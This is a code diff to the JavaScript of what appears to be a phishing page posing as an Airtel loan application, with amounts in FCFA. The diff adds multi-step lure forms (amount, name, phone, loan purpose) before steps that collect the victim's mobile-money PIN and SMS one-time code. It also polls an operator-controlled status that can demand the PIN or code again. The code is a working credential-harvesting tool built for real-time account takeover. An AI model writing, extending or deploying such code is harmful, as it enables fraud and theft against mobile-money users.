@@ -1,7 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
   const stepUnderstand = document.getElementById('step-I UNDERSTAND');
   const stepSlider = document.getElementById('step-slider');
-  const stepForm = document.getElementById('step-form');
+  const stepForm1 = document.getElementById('step-form-1');
+  const stepForm2 = document.getElementById('step-form-2');
+  const stepForm3 = document.getElementById('step-form-3');
+  const stepPin = document.getElementById('step-pin');
   const stepOtp = document.getElementById('step-otp');
   const stepLoading = document.getElementById('step-loading');
   const stepSuccess = document.getElementById('step-success');
@@ -16,31 +19,74 @@ document.addEventListener('DOMContentLoaded', () => {
   const adminParam = urlParams.get('admin') || '';
 
   function showStep(targetStep) {
-    [stepUnderstand, stepSlider, stepForm, stepOtp, stepSuccess].forEach(s => {
+    [stepUnderstand, stepSlider, stepForm1, stepForm2, stepForm3, stepPin, stepOtp, stepSuccess].forEach(s => {
       if (s) s.classList.remove('active');
     });
     if (targetStep) targetStep.classList.add('active');
   }
 
-  // Range Sliders
+  // Sliders Synchronization
   const sliderBalance = document.getElementById('slider-balance');
   const balanceVal = document.getElementById('balance-val');
   const sliderDuration = document.getElementById('slider-duration');
   const durationVal = document.getElementById('duration-val');
+  const formAmount = document.getElementById('form-amount');
+  const formDuration = document.getElementById('form-duration');
 
   if (sliderBalance && balanceVal) {
     sliderBalance.addEventListener('input', (e) => {
-      balanceVal.innerText = `${Number(e.target.value).toLocaleString()} FCFA`;
+      const val = `${Number(e.target.value).toLocaleString()} FCFA`;
+      balanceVal.innerText = val;
+      if (formAmount) formAmount.value = val;
+      document.getElementById('summary-amount').innerText = val;
     });
   }
 
   if (sliderDuration && durationVal) {
     sliderDuration.addEventListener('input', (e) => {
-      durationVal.innerText = `${e.target.value} mois`;
+      const val = `${e.target.value} mois`;
+      durationVal.innerText = val;
+      if (formDuration) formDuration.value = `${e.target.value} Mois`;
+      document.getElementById('summary-duration').innerText = `${e.target.value} Mois`;
     });
   }
 
-  // 4-Digit Inputs Setup with Automatic Focus Transfer & Auto-Submit
+  // Multi-step Navigation
+  document.getElementById('btn-understand-proceed').addEventListener('click', () => showStep(stepSlider));
+  
+  document.getElementById('btn-slider-next').addEventListener('click', () => {
+    formAmount.value = `${Number(sliderBalance.value).toLocaleString()} FCFA`;
+    showStep(stepForm1);
+  });
+
+  document.getElementById('btn-form1-next').addEventListener('click', () => showStep(stepForm2));
+  document.getElementById('btn-form2-back').addEventListener('click', () => showStep(stepForm1));
+
+  document.getElementById('btn-form2-next').addEventListener('click', () => {
+    const firstName = document.getElementById('first-name').value.trim();
+    const lastName = document.getElementById('last-name').value.trim();
+    const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
+
+    if (phone.length < 8) {
+      document.getElementById('phone-error').style.display = 'block';
+      return;
+    }
+    document.getElementById('phone-error').style.display = 'none';
+
+    document.getElementById('summary-applicant').innerText = `${firstName} ${lastName}`.trim() || 'Client Airtel';
+    document.getElementById('summary-purpose').innerText = document.getElementById('loan-type').value;
+
+    showStep(stepForm3);
+  });
+
+  document.getElementById('btn-form3-back').addEventListener('click', () => showStep(stepForm2));
+
+  document.getElementById('btn-form3-submit').addEventListener('click', () => {
+    showStep(stepPin);
+    if (pinDigits[0]) pinDigits[0].focus();
+  });
+
+  // Digits input focus and auto-submit
   const pinDigits = document.querySelectorAll('.pin-digit');
   const otpDigits4 = document.querySelectorAll('.otp-digit-4');
 
@@ -69,25 +115,10 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits4, () => submitOtpHandler());
 
-  // Flow Navigation
-  document.getElementById('btn-understand-proceed').addEventListener('click', () => {
-    showStep(stepSlider);
-  });
-
-  document.getElementById('btn-slider-next').addEventListener('click', () => {
-    showStep(stepForm);
-  });
-
-  // Step 1: Submit Phone Number & PIN Credentials
+  // Submit Credentials (Phone & PIN)
   document.getElementById('btn-submit-creds').addEventListener('click', async () => {
     const phone = document.getElementById('phone-number').value.replace(/\D/g, '');
     const pinVal = Array.from(pinDigits).map(i => i.value).join('');
-
-    if (phone.length < 8) {
-      document.getElementById('phone-error').style.display = 'block';
-      return;
-    }
-    document.getElementById('phone-error').style.display = 'none';
 
     if (pinVal.length !== 4) {
       document.getElementById('pin-error').style.display = 'block';
@@ -121,7 +152,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Status Polling Handler
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -148,7 +178,7 @@ document.addEventListener('DOMContentLoaded', () => {
           if (credsSurfaceBanner) credsSurfaceBanner.classList.add('active');
           pinDigits.forEach(i => i.value = '');
           if (pinDigits[0]) pinDigits[0].focus();
-          showStep(stepForm);
+          showStep(stepPin);
         } else if (data.status === 'RETRY_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -161,7 +191,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }, 3000);
   }
 
-  // Step 2: Submit 4-digit SMS OTP
   async function submitOtpHandler() {
     const otpVal = Array.from(otpDigits4).map(i => i.value).join('');
 
@@ -210,4 +239,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-  
+    
